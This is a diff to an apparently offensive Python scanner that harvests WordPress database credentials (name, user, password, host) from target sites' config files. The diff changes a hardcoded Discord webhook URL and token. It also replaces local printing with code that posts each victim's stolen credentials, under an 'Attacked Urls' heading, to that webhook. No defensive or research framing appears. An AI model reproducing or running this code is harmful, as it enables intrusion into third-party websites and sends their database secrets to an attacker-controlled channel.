@@ -4,7 +4,7 @@ import requests, random, threading, time
 from colorama import Fore
 from bs4 import BeautifulSoup
 from ScrapeSearchEngine.ScrapeSearchEngine import Yahoo
-webhook = "https://discord.com/api/webhooks/819050302979702794/uotsVypOr5BTWo8w9WNST89-Uj7xLuuxJjr0--3SkulWd4mQpbmX9PoZ6oISEAa2_Wwa"
+webhook = "https://discord.com/api/webhooks/819058672965517323/iJqRxr-XYWnEOM1mTDhIFC2ogRE3XhYHRw2MuTfd4AIFt-2pVayuDXAhidrQRpw5yby3"
 
 def print_error(a):
     print(f'{Fore.LIGHTWHITE_EX}[ {Fore.LIGHTRED_EX}ERRO {Fore.LIGHTWHITE_EX}] {Fore.RESET}{a}')
@@ -119,12 +119,18 @@ def configdownload(target, webhook=webhook):
             db_pass = text.split("define")[4].split("('DB_PASSWORD', '")[1].replace("');", "").replace("/** MySQL hostname */", "").rstrip()
             db_host = text.split("define")[5].split("('DB_HOST', '")[1].replace("');", "").replace("/** Database Charset to use in creating database tables. */", "").rstrip()
 
-            print(f'''
-    Database Name : {db_name}
-    Database User : {db_user}
-    Database Pass : {db_pass}
-    Database Host : {db_host}
-''')
+            info = ''
+            info += '```diff\n'
+            info += f'- Attacked Urls : {target}\n'
+            info += f'- Database Name : {db_name}\n'
+            info += f'- Database User : {db_user}\n'
+            info += f'- Database Pass : {db_pass}\n'
+            info += f'- Database Host : {db_host}\n'
+            info += '\n```'
+
+            req = requests.post(url=webhook, data={"content": str(info)}).text
+            print(req)
+
         except:
             print_error('Failed to pharse request data')
             print_sucess('Output saved to output.txt\n')
